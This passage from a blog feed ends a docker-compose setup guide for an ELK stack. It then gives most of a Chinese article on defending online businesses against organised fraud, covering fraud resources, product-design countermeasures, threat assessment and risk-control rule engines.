class="bullet">-</span> <span class="string">cluster.name=es-docker-cluster</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">discovery.seed_hosts=es01,es03</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.initial_master_nodes=es01,es02,es03</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bootstrap.memory_lock=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"ES_JAVA_OPTS=-Xms512m -Xmx512m"</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">memlock:</span></span><br><span class="line">        <span class="attr">soft:</span> <span class="number">-1</span></span><br><span class="line">        <span class="attr">hard:</span> <span class="number">-1</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">data02:/usr/share/elasticsearch/data</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elastic</span></span><br><span class="line">  <span class="attr">es03:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/elasticsearch/elasticsearch:7.9.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">es03</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">node.name=es03</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.name=es-docker-cluster</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">discovery.seed_hosts=es01,es02</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cluster.initial_master_nodes=es01,es02,es03</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bootstrap.memory_lock=true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"ES_JAVA_OPTS=-Xms512m -Xmx512m"</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">memlock:</span></span><br><span class="line">        <span class="attr">soft:</span> <span class="number">-1</span></span><br><span class="line">        <span class="attr">hard:</span> <span class="number">-1</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">data03:/usr/share/elasticsearch/data</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elastic</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">logstash:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/logstash/logstash:7.9.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">logstash</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">bind</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">./logstash/config/logstash.yml</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/logstash/config/logstash.yml</span></span><br><span class="line">        <span class="attr">read_only:</span> <span class="literal">true</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">bind</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">./logstash/pipeline/logstash.conf</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/logstash/pipeline/logstash.conf</span></span><br><span class="line">        <span class="attr">read_only:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5000:5000/tcp"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5000:5000/udp"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9600:9600"</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">LS_JAVA_OPTS:</span> <span class="string">"-Xmx512m -Xms512m"</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elastic</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">kibana:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">docker.elastic.co/kibana/kibana:7.9.0</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">kibana</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">bind</span></span><br><span class="line">        <span class="attr">source:</span> <span class="string">./kibana/config/kibana.yml</span></span><br><span class="line">        <span class="attr">target:</span> <span class="string">/usr/share/kibana/config/kibana.yml</span></span><br><span class="line">        <span class="attr">read_only:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">I18N_LOCALE=zh-CN</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"5601:5601"</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">elastic</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">data01:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">data02:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">data03:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">local</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">elastic:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br></pre></td></tr></table></figure><p><strong>Logstash中安装json_lines插件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it logstash /bin/bash</span><br><span class="line">logstash-plugin install logstash-codec-json_lines</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/deviantony/docker-elk/" target="_blank" rel="noopener">https://github.com/deviantony/docker-elk/</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/docker.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/docker.html</a></li><li><a href="https://www.elastic.co/guide/en/kibana/current/docker.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/kibana/current/docker.html</a></li><li><a href="https://www.elastic.co/guide/en/logstash/current/docker.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/logstash/current/docker.html</a></li><li><a href="https://www.elastic.co/cn/blog/how-to-make-a-dockerfile-for-elasticsearch" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/how-to-make-a-dockerfile-for-elasticsearch</a></li><li><a href="https://www.elastic.co/cn/blog/elasticsearch-docker-plugin-management" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/elasticsearch-docker-plugin-management</a></li><li><a href="https://www.elastic.co/cn/blog/docker-networking" target="_blank" rel="noopener">https://www.elastic.co/cn/blog/docker-networking</a></li><li><a href="https://github.com/lmenezes/cerebro" target="_blank" rel="noopener">https://github.com/lmenezes/cerebro</a></li><li><a href="https://github.com/helm/charts/tree/master/stable/elastic-stack" target="_blank" rel="noopener">https://github.com/helm/charts/tree/master/stable/elastic-stack</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;The Elastic stack (ELK) powered by Docker and Compose.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Docker" scheme="https://xinlichao.cn/categories/Docker/"/>
    
    
      <category term="docker" scheme="https://xinlichao.cn/tags/docker/"/>
    
      <category term="ELK" scheme="https://xinlichao.cn/tags/ELK/"/>
    
  </entry>
  
  <entry>
    <title>业务安全</title>
    <link href="https://xinlichao.cn/back-end/security/security-business/"/>
    <id>https://xinlichao.cn/back-end/security/security-business/</id>
    <published>2020-07-18T20:30:00.000Z</published>
    <updated>2021-02-26T10:23:44.682Z</updated>
    
    <content type="html"><![CDATA[<p>对比于传统的基础安全，业务安全有哪些特点呢？为什么它能够成为一个独立的领域呢？在业务安全中，我们需要重点关注的防护方法又有哪些呢？</p><a id="more"></a><h2 id="业务安全体系"><a href="#业务安全体系" class="headerlink" title="业务安全体系"></a>业务安全体系</h2><p>近几年，随着互联网的快速发展，很多公司为了获取用户增长，在业务中投入了大量的资本。向来都是向钱看齐的黑客（在业务安全中，我们称之为黑产），自然就将攻击的重心放到了业务中。业务安全也变得越来越热门，成为各大公司安全投入的重心之一。</p><h3 id="如何理解业务安全？"><a href="#如何理解业务安全？" class="headerlink" title="如何理解业务安全？"></a>如何理解业务安全？</h3><p>想要理解业务安全，我们先来认识一下黑产。黑产是基于正常的业务产品逻辑，采取非正常或者批量的操作，来获取利益的行为。业务安全就是通过各类产品策略，来对黑产进行识别和拦截，从而保障业务的正常运行。</p><p>你一定见过，或者参加过“红包雨”领红包的活动。在活动中，用户可以通过“红包雨”游戏领取一定金额的红包，金额大小由前端决定。通过这个例子，我们来对比一下黑客和黑产的攻击。</p><p>在基础安全的攻击视角中，黑客会逆向前端代码，找到最终决定金额的逻辑，然后自己伪造一个大额的红包请求。这样一来，黑客就可以不用玩游戏，同时还能获得一个大额的红包。 在业务安全的攻击视角中，黑产会开发一个自动玩游戏领红包的工具，操纵大量的账号来参与活动。最终，将各个账号的小额红包汇总到一个账号下，从而实现获利。</p><h3 id="黑产和黑客有哪些差异？"><a href="#黑产和黑客有哪些差异？" class="headerlink" title="黑产和黑客有哪些差异？"></a>黑产和黑客有哪些差异？</h3><p>在基础安全中，黑客会通过各种 Web 安全或者系统安全的漏洞，对公司的系统和应用发起攻击，最终侵入公司系统，窃取敏感信息等成果。“黑客”原意是指擅长各类计算机技术的人，也就是在基础安全领域中，掌握各种高端技巧，能够发现并利用漏洞的攻击者。但是，在业务安全中，业内普遍将攻击者称为“黑产”。之所以会改换一个名称，我认为主要有两点原因。</p><p><strong>第一，“黑产”强调的是“产业化”。</strong></p><p>尽管黑客也存在很多组织，但黑客组织更多的是将一群黑客进行统一管理，实际发起攻击的仍然是单人或者小组。</p><p>相比于黑客，在业务攻击中，黑产已经形成了完整的产业化链条：在上游，有人专门提供各类技术支持，如验证码绕过、手机群控、自动注册工具等；在中游，有人专门收集大量的手机号、身份证号、银行卡号等信息，在应用内注册大量的垃圾账号；在下游，有人利用工具和账号，进行薅羊毛、刷评论、欺诈等操作。可以说，任何个人或者小的团体都没有办法发起业务攻击，必须依靠上游提供的各类资源，才能够实现真正获利。产业链的结构如下图所示</p><p><img src="/images/security/security-business/1.jpg" alt="1"></p><p><strong>第二，黑客强调的是技术对抗，而“黑产”更看重资源对抗。</strong></p><p>对于黑客来说，只要技术足够强大，并且手里掌握着一些“0 day”漏洞，就能够以一己之力攻破公司的安全防御体系。但是对于黑产来说，其本质是资源对抗，所以不可能有类似黑客的“单兵作战”。那什么是资源对抗呢？</p><p>我们来看一个例子。现在有一个“新用户注册得红包”的活动，公司可能会给每个新用户发放 1 元的现金红包，以此作为用户增长的激励措施。这个时候，如果黑产注册一个新用户的成本是 2 元（需要手机号、银行卡等各种资源支持），那显然是一个亏本的买卖。因此，黑产需要想尽办法去降低注册资源的成本。如果是你，你会怎么做呢？</p><p>生活中就有很多这样的例子。以前，你想要骑一辆自行车，需要花几百块钱买一辆。而现在，你花上一块钱，就能够骑上共享单车，还能够“随停随走”。黑产的资源对抗也是利用的这种“共享”思想：在黑产的中上游，由专门的团伙负责大批量收集各类资源，供很多下游团伙使用，这样就能在很大程度上降低黑产发起攻击的成本。</p><p>现在，黑产购买一个手机号的成本只需要几毛钱，而互联网应用获取一个新用户需要花费几十元，这其中的利益之大可见一斑。</p><p>从黑客与黑产之间的攻击差异中，我们能够发现基础安全和业务安全的核心差异。基础安全是防御黑客的技术攻击，避免漏洞。业务安全是防御黑产的资源对抗，避免正常业务被攻击。</p><h3 id="业务安全如何防护？"><a href="#业务安全如何防护？" class="headerlink" title="业务安全如何防护？"></a>业务安全如何防护？</h3><p>在基础安全中，我们说过应用的本质是数据，安全的本质是数据的 CIA，我们可以通过黄金法则来保护数据。那么，对于业务安全来说，我们的防护思路又是怎么样的呢？</p><p>我们还是要从业务的本质入手来解决问题。我认为，业务的本质是一种投资，也就是公司投入成本来获取用户价值。投入的成本包括应用开发的成本、服务的成本以及获取用户的成本等。</p><p>用户的价值也多种多样，直接的如收取用户的服务费用，间接的如通过用户来获取广告收益、通过用户来吸引商家入驻收取租金等。那黑产是如何从中获利的呢？</p><p>黑产的获利手段是通过廉价的资源，降低用户的价值，从而赚取公司投入的成本。因此，业务安全的本质就是保障用户价值不受黑产的恶意影响。保障的方法就是提高黑产的资源成本，使得黑产无法获利。这也就是我所说的，业务安全的本质其实就是资源层次上的对抗。</p><p>那我们应该如何进行资源对抗呢？首先，我们要知道，黑产需要进行哪些资源投入。一般来说，黑产会从四个方面进行资源投入，分别是：用户资源、IP 资源、设备资源和操作资源。</p><p><strong>首先是用户资源。</strong></p><p>黑产通常需要获取大量的用户身份，来进行大规模的业务操作，才能实现获利。这是因为，应用通常会要求用户绑定各种信息，比如手机号、身份证、银行卡等。而黑产需要满足应用的强制绑定要求，才能获得用户身份。因此，这些手机号、身份证以及银行卡等，其实就是黑产必须投入的用户资源。</p><p>现在，黑产有很多办法可以获取这些用户资源。我来总结了几个常见的方法：</p><ul><li>通过虚拟运营商或者物联网卡来获取大量非实名手机卡</li><li>在网上搜集各类泄露的身份证图片</li><li>在偏远地区支付十几块钱，买到他人的手持身份证照片和视频</li><li>在类似注册任务贴吧这样的任务群中，注册一个账号之后，再转手卖给黑产</li></ul><p>对于用户资源的对抗，目前主要的方式就是黑名单。这里，我把黑名单的防护流程总结了一张图。</p><p><img src="/images/security/security-business/2.jpg" alt="2"></p><p>从上图中我们可以看到，用户黑名单主要有两种收集方式：内部收集和外部采购。其中，内部收集是基于用户在业务内部的行为进行判定的，流程相对复杂一些，而外部采购是直接购买汇总好的黑名单。这样一来，我们就利用黑名单实现了对黑产的拦截。</p><p><strong>接着，我们来说 IP 资源。</strong></p><p>黑产往往是在同一个地方进行大量操作的，IP 相对固定。所以，任何公司做业务安全的第一步，都是对 IP 进行限制，常见的手段是限制一个 IP 下能够登录的用户数量。为了绕过这种安全防控机制，黑产必须掌握大量的 IP 资源。</p><p>如果你有做过爬虫，一定知道通过快代理这种网上的免费代理，来绕过反爬机制。而黑产更高级一些，黑产会利用“秒拨 IP”来获取大量 IP 资源。所谓“秒拨”，就是指每一次拨号上网，都会分配一个新的 IP 给我们。只要持续地断网、拨号，我们就能够获得大量的 IP 资源。</p><p>下图是某个代理 IP 网站的报价，我们可以看到，目前代理 IP 的价格最低只要 0.5 分钱。也就是说，黑产只需要付出很少的成本就能获得大量 IP 资源。</p><p><img src="/images/security/security-business/3.jpg" alt="3"></p><p>事实上，我们目前很难对 IP 资源进行有效防控。IP 的变化十分频繁，一个 IP 上一分钟可能是黑产在操作，下一分钟可能就被正常用户所使用了。所以，即使我们能基于业务数据确定一个 IP 存在异常，也没有办法对它进行黑名单处理。</p><p><strong>除了 IP 之外，设备也是公司做业务安全的一个基础。</strong></p><p>在正常情况下，一个设备对应一个账号。但是，黑产可能会需要在一个设备上使用几十个账号进行操作，这就很容易被应用和公司检测到异常。因此，黑产必须想办法获取大量的设备。</p><p>黑产获取设备的方法比较多，最简单的一种是通过模拟器来模拟设备。但是，很多公司会对前端进行检测，来发现模拟设备。因此，黑产也就从使用模拟设备升级为使用真实的手机。所以，很多黑产案件中都会出现由大量手机设备组成的“手机墙”。除此之外，也有上游团队将手机做成云控模式，下游黑产可以直接花钱购入可远程操控的真实手机设备。</p><p>设备资源的对抗原理是对虚拟设备进行识别。这就需要依赖业务安全中比较关键的设备指纹技术了。所谓“设备指纹技术”，就是收集设备上的各类特征，对设备进行追踪，然后基于设备的行为和信息，判定是虚拟设备还是人为操作，以此对黑产进行拦截。</p><p><strong>最后是操作资源。</strong></p><p>黑产需要正常使用业务才能获利，所以在操作上会和正常用户一样花费时间和精力。这对黑产来说，也是一个不小的成本。</p><p>比如说，在开头的例子中，用户参加“红包雨”游戏领取红包的过程，就是一个操作的过程：用户为了领取一个几毛钱的红包，在 APP 上花几分钟玩一个游戏。这显然对黑产是不合算的。因此，黑产会尝试使用一些自动化的工具，比如按键精灵，让机器来完成游戏的过程。这样一来，黑产就释放了人力的操作资源投入，大大降低了操作成本。</p><p>所以说，我们和操作资源的对抗，就是在和黑产的自动化工具进行对抗。公司为了区分“人”和“机器”的操作，就需要使用验证码（如图片验证码、滑块验证码等）。通过这类“人”很容易完成，但“机器”很难完成的验证方式，黑产就没办法全自动地完成交互，我们也就提高了黑产的操作成本。</p><p>总之，业务安全的防护核心就是提高黑产的资源成本。更详细的防护方案，我们会在后面的课程中详细来讲，这里你只需要对这几种资源有一个全面的认知即可。</p><p><img src="/images/security/security-business/4.jpg" alt="4"></p><h2 id="产品安全方案"><a href="#产品安全方案" class="headerlink" title="产品安全方案"></a>产品安全方案</h2><h3 id="业务安全中的防御框架是什么？"><a href="#业务安全中的防御框架是什么？" class="headerlink" title="业务安全中的防御框架是什么？"></a>业务安全中的防御框架是什么？</h3><p>我们可以通过 NIST 的安全框架 IPDRR，在基础安全中构建出一道比较全面的纵深防线。在业务安全中，IPDRR 同样可以指导我们与黑产进行对抗。这里我总结了一张对比表格，你可以先了解一下 IPDRR 在基础安全和业务安全中的异同点。</p><p><img src="/images/security/security-business/5.jpg" alt="5"></p><ul><li>Identify（识别）：和基础安全一样，业务安全的识别阶段主要是进行威胁评估的工作。我们需要找到黑产可能获取到的业务逻辑中的投入成本，比如，应用发放的红包、优惠券等。</li><li>Protect（保护）：在业务安全中，我们是通过产品方案来实施认证和授权过程的。比如，对于登录过程增加双因子认证和验证码等，就是加强认证的安全性。</li><li>Detect（检测）：检测阶段主要是风控系统发挥作用。</li><li>Respond（响应）：发现黑产的攻击后，我们可以通过封禁账号、拦截操作、拒绝提现等方式，来阻止黑产获取利益。</li><li>Recover（恢复）：最后就是对整个系统进行恢复了。在业务安全中，黑产可能已经盗取了某些账号，或者已经领取了部分红包。这时，我们就需要通过合适的运营机制，将账号返回给原用户，把红包退回到奖金池中。</li></ul><h3 id="业务安全中的威胁评估怎么做？"><a href="#业务安全中的威胁评估怎么做？" class="headerlink" title="业务安全中的威胁评估怎么做？"></a>业务安全中的威胁评估怎么做？</h3><p>前面说了，在识别过程中，我们的主要工作就是威胁评估。在业务安全中，黑产的最终目的是窃取公司投入的成本来获取利益，但公司成本的具体表现形式很多，因此，业务安全中的威胁评估也更加复杂。下面，我就以一个典型的业务场景为例，总结在业务安全的威胁评估中，我们需要重点考虑的因素。</p><p>我们来看最近比较流行的邀约活动，几乎所有的 App 都会在拉新阶段开启各种各样的邀约活动。而且对于这类能够刺激用户增长的活动，公司都很舍得投入大量的资本，因此邀约活动是黑产聚集的“重灾区”。</p><p>邀约的逻辑：已注册用户可以通过邀请码的形式邀请新用户注册，注册成功后（可能需要新用户完成一定任务）双方都可以获得一定的奖励，如现金红包（可以参考拼多多）。</p><p>邀约活动的目的很明确，就是拉取新用户为公司带来用户增长。那对黑产来说，获利的方式就是通过大量注册小号，完成邀约任务，获得现金红包的奖励。现在的奖励金额一般是几块到十几块不等，因此，黑产的利润很高。</p><p>这个时候，如果公司想要拦截邀约活动中的黑产用户，需要考虑哪些因素呢？我认为需要重点考虑实时性要求、漏判影响和误伤影响这三方面因素。实时性很好理解，就是我们要评估在哪个阶段对黑产进行评估和拦截。所谓漏判，就是没有识别出黑产，让其成功获利。而误伤就是正常用户被判定成了黑产，无法正常使用业务功能。</p><p>下面，我就来说说原因。</p><p><strong>首先是实时性要求。</strong></p><p>选择拦截黑产的时机是非常重要的。一般来说，拦截时间越靠前就能越早拦截黑产，但是误伤对用户体验的损伤也越大，而拦截时间越靠后风险越小。除此之外，我们还要考虑业务的逻辑。</p><p>比如，对于邀约活动来说，红包提现一般都需要审核。因此，我们不需要在邀约活动中实时拦截，只需要在提现的时候进行拦截即可。这样的拦截方式风险更小、效果更好。</p><p>我们在指定业务安全防控策略的时候，漏判影响和误伤影响决定了策略的严格程度。如果漏判影响更大，就需要制定更严格的策略对黑产进行控制；如果误伤影响更大，策略要相对宽松，有的时候我们甚至可以放过一定的黑产来降低误伤。</p><p>对于邀约活动来说，在黑产刷走大量现金之后，漏判影响是指公司有大量的资金损失。这对公司来说并不致死，因为用户的正常邀约行为不会受到黑产影响。</p><p>误伤影响比漏判影响严重的多，误伤一旦出现，就会让用户对邀约活动的真实性产生质疑。如果你做过业务，一定知道，用户的信任是很难培养的。而一旦丧失了用户的信任，业务基本也就失败了。因此，公司基本不容许出现误伤的拦截。</p><p>总之，对于邀约活动的业务安全防御来说，避免误伤是我们最核心的关注点。为了避免误伤，我们可以将防御机制延后，避免对用户正常参与活动的流程产生影响。同时，我们可以将防控策略放宽，通过放过一定的黑产来降低误伤。</p><p>当然，还有很多其他类型的业务和活动，比如，微博中常见的排行榜、支付宝的集福抽奖活动，你可以试着对它们进行一次威胁评估工作，来看看在这些业务活动中，我们所面临的黑产威胁是什么样的，以及我们应该以什么样的态度去防御黑产。</p><p>这三种业务场景的威胁评估结果，我总结了一张表格，供你参考。</p><p><img src="/images/security/security-business/6.jpg" alt="6"></p><p>上图中的评估结果就足够我们了解这些业务面临的黑产风险了，所以，对于任何一个业务来说，我们其实都可以从业务目标、黑产获利程度、实时性要求、漏判影响和误伤影响这 5 个方面进行威胁评估。</p><h3 id="如何利用产品方案防御黑产？"><a href="#如何利用产品方案防御黑产？" class="headerlink" title="如何利用产品方案防御黑产？"></a>如何利用产品方案防御黑产？</h3><p>在登录业务中，我们需要防止盗号的发生。这种情况下的安全产品方案就是提高黑产发起盗号的资源成本，比如，我们可以在产品机制上加入二次验证机制，如短信验证等。这样一来，黑产需要完成一次登录的成本就大大增加了。</p><p>相比于我们使用各种复杂的策略和算法对每一次登录行为进行判定，安全产品方案的实现更简单一些，只需要增加一个基本功能就足够了。而且安全产品方案其实不识别黑产，也就不存在误伤和漏判，只需要考虑用户体验的损伤就足够了。因此，一个安全的产品方案是对抗黑产最有效的防护手段。</p><p>下面，我们再以“满减红包”为例，来讨论一下产品方案中需要考虑的防控因素有哪些。</p><p>“满减红包”是各类电商、O2O 领域中最常见的促销手段。但是这种促销手段，很可能因为产品方案不当引来黑产的攻击。比如，前两年“饿了么”对新用户的补贴较多的时候，就有人利用新用户的大额红包代下单外卖，实现获利。</p><p>我们来看看“满减红包”常见的维度有哪些。</p><p><img src="/images/security/security-business/7.jpg" alt="7"></p><p>可以看出，通过对领取条件、满减金额和有效期进行不同的限制，我们就可以设计不同的产品方案，来达到不同的安全等级。下面，我们来具体分析一下。</p><ul><li>领取条件：注册就给红包，会给与黑产极大的便利。而下单后再减，能刺激用户再消费，有了前一单的收益，下一单的红包补贴就基本不会亏。当补贴减少时采取会员制，公司就能通过会员费来增加额外的收入。</li><li>满减金额：满减条件同样是需要慎重把握的一个方案。满 10 减 10，相当于不需要黑产付出任何成本。一旦变成满 10.01 减 10，效果就天差地别了。想要支付这多出的 1 分钱，黑产必须进行一个完整的支付流程，必须绑定银行卡等其他支付方式，这些都是额外的成本。而满 30 减 10，对公司来说应该是稳赚不赔的，也就不需要考虑漏判的风险。</li><li>有效期：有效期过长同样会给黑产带来便利。因为黑产售卖“满减红包”或者“代下单”，是需要时间来找买家的。所以，有效期越长，黑产卖红包的时间就越长。如果把有效期设为 2 天，黑产就很有可能面临优惠券卖不出去而过期的风险，收益就会大大降低。</li></ul><p>那平台是如何限制“代下单”这种行为的呢？最常见的，当饿了么下单的手机号变更时，是不允许使用之前的红包的。而且，饿了么也不允许备注中出现手机号。这些产品方案其实都是在提高黑产“代下单“的成本。</p><p>总结来说，安全产品方案是不存在标准答案的，更多的是根据业务的诉求来进行衡量。但在任何情况下，我都不建议忽略掉安全产品方案。为什么这么说呢？其实，借助刚才的分析我们就能知道，满减条件中的满 10 减 10 和满 10.01 减 10，对正常用户来说没有什么区别，却能给业务安全带来极大增益。因此，我们可以在业务发展初期，适当降低安全产品方案的复杂程度，但是仍然要保持必要的信息和数据收集。在业务稳定后，再逐步进行完善和升级。</p><p>提升应用安全性的产品方案还有很多。我总结了一些常见的例子，你可以了解一下。</p><p>在邀约活动中，我们可以适当增加用户任务的难度，如必须连续活跃三天用户才能得到收益；在抽奖活动中，我们可以增加参与抽奖的门槛，如必须是注册一个月以上的老用户才能参加；在排行榜活动中，我们可以将排行榜的计算规则隐藏，让黑产摸不清刷的方式。这些常见的安全产品方案可以提升黑产攻击业务的成本，让业务更安全。</p><h2 id="风控系统"><a href="#风控系统" class="headerlink" title="风控系统"></a>风控系统</h2><h3 id="如何理解风控系统？"><a href="#如何理解风控系统？" class="headerlink" title="如何理解风控系统？"></a>如何理解风控系统？</h3><p>简单来说，风控系统就是从业务数据中挖掘出黑产行为的数据分析系统。</p><p>我们可以通过对比产品方案来深入理解风控系统。</p><ul><li>产品方案抵御黑产的方式，是普适性地提高用户的使用成本，不区分用户是否是黑产。因此在产品方案中不存在数据挖掘和分析的工作。</li><li>在风控系统抵御黑产的过程中，为了不增加正常用户的使用成本，我们必须对黑产用户进行区分，然后告诉业务只对黑产进行拦截，放行正常用户。而区分黑产就需要对海量的业务数据进行分析和挖掘了。</li></ul><p>总结来说：产品方案属于事前的防控，是从根本上提高黑产操作的成本；风控系统属于事中的防控，是在检测到黑产行为时才进行拦截。</p><p>目前，风控系统的整体框架已经基本成熟了，各个公司的风控系统也都大同小异。一般来说，一个完整的风控系统框架应当包括前端 SDK、规则引擎和验证流程。但是，一个完整的风控流程还需要人工进行数据分析、处理用户投诉、监控舆情，并采取应急响应机制。完整的风控流程如下图所示：</p><p><img src="/images/security/security-business/8.jpg" alt="8"></p><h3 id="风控系统如何利用前端-SDK-采集数据？"><a href="#风控系统如何利用前端-SDK-采集数据？" class="headerlink" title="风控系统如何利用前端 SDK 采集数据？"></a>风控系统如何利用前端 SDK 采集数据？</h3><p>想要在风控中做好数据分析，数据当然是越多越好。我们只有尽可能多地采集各类用户的数据，才能够更准确地识别黑产。各类用户数据包括用户身份信息、行为记录、设备类型、鼠标或者屏幕点击轨迹等。</p><p>但是，业务在正常的开发过程中，一般不会采集和业务无关的数据（比如设备相关的信息）。为了解决这个问题，风控系统通常会提供一个前端 SDK。前端 SDK 由业务集成在前端应用中，它可以采集各类前端数据，如手机型号、硬件类型等。</p><p><img src="/images/security/security-business/9.jpg" alt="9"></p><p>除此之外，前端 SDK 还会计算出一个唯一的设备指纹，通过这个设备指纹，我们就能够实现对设备行为的追踪。</p><h3 id="规则引擎如何帮助风控系统识别黑产？"><a href="#规则引擎如何帮助风控系统识别黑产？" class="headerlink" title="规则引擎如何帮助风控系统识别黑产？"></a>规则引擎如何帮助风控系统识别黑产？</h3><p>采集到业务数据之后，我们就要对其中的黑产进行识别了。在风控系统中，一次操作行为是来自黑产还是正常用户，是由规则引擎来决定的。那么，规则引擎是如何识别黑产的呢？</p><p>规则引擎会接收到业务提供的原始数据，而想要从中识别出黑产，我们首先需要通过一些统计手段找到其中有用的特征。那什么是“有用的特征”呢？</p><p>举个例子，想要从登录行为中识别出黑产，仅仅知道设备指纹是不够的，我们还需要知道，这个设备在最近一段时间内发起了多少次登录请求。这就是特征提取需要进行的工作了。</p><p>经过特征提取得到特征之后，我们就需要制定规则对登录行为进行判定。比如说，我们可以定义，一个设备在 1 分钟内登录 5 次的行为属于异常行为，应当进行拦截。</p><p>这样一来，当有新的登录行为发生时，通过规则引擎，我们就可以直接判定其是否为黑产。规则引擎的识别过程如下图：</p><p><img src="/images/security/security-business/10.jpg" alt="10"></p><p>那么，应该如何做好一款规则引擎呢？我认为关键在两个方面：采用正确的工作模式、设计高效的规则管理功能。</p><p><strong>正确的工作模式</strong></p><p>规则引擎可以分为同步、异步和离线三种模式。下面，我就以登录场景为例，为你解释一下这三种模式的工作过程。</p><p><strong>在同步模式下</strong>，用户输入完用户名密码之后，需要先经过规则引擎的判定，只有正常用户才能够正常登录，黑产则直接被拦截，不允许登录。</p><p><strong>在异步模式下</strong>，用户一开始是可以正常登录的，登录后才交由规则引擎判定，如果最终确定是黑产，则会被封号或者踢出登录状态。</p><p><strong>离线模式</strong>的效果和异步模式一致，不过异步模式通常会在几秒到几分钟的时间内完成判定和处罚，离线模式则需要几小时甚至一天的时间才能够完成判定。</p><p>这三种模式的工作过程如下图：</p><p><img src="/images/security/security-business/11.jpg" 